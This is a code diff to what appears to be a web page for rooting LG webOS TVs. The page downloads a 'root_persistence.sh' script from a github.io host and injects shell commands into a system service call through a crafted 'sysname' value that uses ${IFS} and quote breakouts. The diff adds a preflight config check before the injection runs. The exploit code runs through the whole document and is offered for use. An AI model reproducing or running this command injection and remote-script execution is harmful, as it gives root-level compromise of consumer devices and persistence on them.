@@ -56,6 +56,7 @@
       color: #cecece;
       word-break: break-word;
     }
+
   </style>
 </head>
 <body>
@@ -70,6 +71,7 @@
     var scriptPath = '/media/internal/downloads/root_persistence.sh';
     var downloadTarget = 'https://azoffshowy.github.io/dangbro/resources/root_persistence.sh';
     var debugMode = new URLSearchParams(window.location.search).has('debug');
+    var broadcastConfigNames = ['tv.nyx.tvBroadcastSystem', 'tv.model.sysType'];
 
     function setState(name, detail) {
       stateEl.textContent = name;
@@ -94,7 +96,7 @@
       }
     }
 
-    function runLegacyBroadcast() {
+    function runLegacyBroadcast(preInjectMessage) {
       var settled = false;
       var bridge = new window.PalmServiceBridge();
       bridge.onservicecallback = function (payload) {
@@ -117,7 +119,49 @@
           data: "ciplus20: sub=/ cmd=unbind sysname=';chmod${IFS}+x${IFS}" + scriptPath + ";" + (debugMode ? 'UPLOAD_LOG=1${IFS}' : '') + scriptPath + ";#'"
         })
       );
-      setState('pending', 'inject sent — watch your TV screen for the result. If nothing happens within 10s your TV might be patched.');
+      setState('pending', preInjectMessage+'watch your TV screen for the result. If nothing happens within 10s your TV might be patched.');
+    }
+
+    function preflightLegacyBroadcast() {
+      var settled = false;
+      var bridge = new window.PalmServiceBridge();
+      var requestPayload = {
+        configNames: broadcastConfigNames
+      };
+      bridge.onservicecallback = function (payload) {
+        if (settled) return;
+        settled = true;
+
+        var parsed = parse(payload);
+        if (!isObject(parsed) || parsed.returnValue === false) {
+          runLegacyBroadcast('Could not confirm tvBroadcastSystem. Still trying inject...');
+          return;
+        }
+
+        var configs = isObject(parsed.configs) ? parsed.configs : {};
+        var broadcastSystem = typeof configs['tv.nyx.tvBroadcastSystem'] === 'string'
+          ? configs['tv.nyx.tvBroadcastSystem'].trim().toUpperCase()
+          : '';
+        if (!broadcastSystem && typeof configs['tv.model.sysType'] === 'string') {
+          broadcastSystem = configs['tv.model.sysType'].trim().toUpperCase();
+        }
+
+        if (broadcastSystem === 'DVB') {
+          runLegacyBroadcast('tvBroadcastSystem is DVB, looks good. Trying inject...');
+          return;
+        }
+
+        if (broadcastSystem) {
+          runLegacyBroadcast('tvBroadcastSystem is ' + broadcastSystem + ', not DVB. It will likely fail. Still trying inject...');
+          return;
+        }
+
+        runLegacyBroadcast('Could not confirm tvBroadcastSystem. Still trying inject...');
+      };
+      bridge.call(
+        'luna://com.webos.service.config/getConfigs',
+        JSON.stringify(requestPayload)
+      );
     }
 
     function watchDownload(ticket) {
@@ -138,7 +182,7 @@
         }
         if (parsed.completed === true && parsed.aborted !== true && parsed.interrupted !== true) {
           settled = true;
-          runLegacyBroadcast();
+          preflightLegacyBroadcast();
           return;
         }
         if (parsed.aborted === true || parsed.interrupted === true || parsed.state === 'failed') {
